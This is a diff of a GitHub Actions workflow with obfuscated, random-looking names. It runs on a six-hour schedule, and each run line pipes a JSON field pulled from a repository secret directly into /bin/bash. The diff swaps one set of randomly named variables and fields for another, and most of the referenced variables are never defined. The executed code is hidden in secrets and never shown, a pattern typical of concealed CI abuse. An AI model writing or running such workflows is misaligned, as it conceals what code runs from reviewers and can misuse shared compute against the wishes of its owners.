@@ -1,8 +1,9 @@
 name: daichengwei6175
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 0/6 * * *'
+    - cron: '34 2/6 * * *'
 
 jobs:
   build:
@@ -12,17 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: daichengwei6175
         env:
-          ax509: ${{ secrets.ax509 }}
+          c43: ${{ secrets.c43 }}
         run: |
-          echo $ax509 | jq -r .ryfeg596 | /bin/bash
-          echo $ivagd8631 | jq -r .cxaff64 | /bin/bash
-          echo $ae29 | jq -r .ngc30112 | /bin/bash
-          echo $qqcc229 | jq -r .mdbjk7621 | /bin/bash
-          echo $tnqoy5288 | jq -r .yu2169 | /bin/bash
-          echo $hh9557 | jq -r .fax15134 | /bin/bash
-          echo $cbk428 | jq -r .xbmf2 | /bin/bash
-          echo $rsdy1 | jq -r .bhhr0 | /bin/bash
-          echo $dwrcr73170 | jq -r .hcrk70 | /bin/bash
-          echo $z11 | jq -r .zfiuq55 | /bin/bash
-          echo $prbf22078 | jq -r .yx647 | /bin/bash
+          echo $c43 | jq -r .lafy4 | /bin/bash
+          echo $jn7547 | jq -r .vdh4 | /bin/bash
+          echo $j0 | jq -r .lbafs29212 | /bin/bash
+          echo $nppmf20460 | jq -r .n1362 | /bin/bash
+          echo $wil46605 | jq -r .prnd62593 | /bin/bash
+          echo $txyng99334 | jq -r .n6733 | /bin/bash
+          echo $r7 | jq -r .jzjlr201 | /bin/bash
 
